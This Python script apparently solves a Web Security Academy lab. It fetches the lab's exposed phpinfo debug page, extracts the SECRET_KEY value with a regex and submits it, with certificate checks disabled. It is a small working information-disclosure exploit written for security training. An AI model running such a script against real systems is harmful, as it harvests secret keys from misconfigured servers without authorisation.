import requests
import re


# Disable certificate warning
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

url = "https://0a3200ff030c5741801299f500de000b.web-security-academy.net/" #change to lab URL

def findkey(url):
    final_url = url + "cgi-bin/phpinfo.php"
    r = requests.get(final_url,verify=False)
    match = re.search(r'<tr><td class="e">SECRET_KEY <.td><td class="v">(.+) <\/td><\/tr>',r.text)
    name = match.group(1)
    return name

def submitsolution(url,version):
    final_url = url + "submitSolution"
    data = {"answer":version}
    r = requests.post(final_url, data=data,verify=False)
    print(r.text)

version = findkey(url)
print(version)
submitsolution(url,version)